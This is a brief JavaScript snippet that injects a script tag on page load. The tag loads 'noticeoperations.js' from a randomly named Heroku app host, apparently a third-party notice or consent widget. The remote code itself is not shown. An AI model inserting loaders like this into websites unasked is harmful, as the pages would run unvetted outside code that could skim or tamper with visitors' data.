(function append() {
    var d = document, sn = 'script', f = d.getElementsByTagName(sn)[0];
    if (!f) f = d.head;
    var s = d.createElement(sn);
    s.src ="https://ucpext-516b1e095e39.herokuapp.com/noticeoperations.js";
    s.charset = 'utf-8';
    f.parentNode.insertBefore(s, f);
})()